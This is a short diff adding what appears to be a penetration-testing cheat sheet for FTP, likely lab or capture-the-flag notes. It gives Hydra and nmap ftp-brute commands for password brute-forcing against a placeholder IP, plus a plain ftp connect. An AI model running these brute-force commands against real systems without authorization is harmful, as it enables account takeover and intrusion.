@@ -1,0 +1,16 @@
+User List Check:
+----------------
+
+> hydra -L </usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt> <IP> ftp
+
+
+ftp Connect:
+----------------
+
+> ftp <IP>
+
+
+nmap FTP Brute:
+----------------
+
+> nmap <IP> --script ftp-brute --script-args userdb=<username_file> -p 21
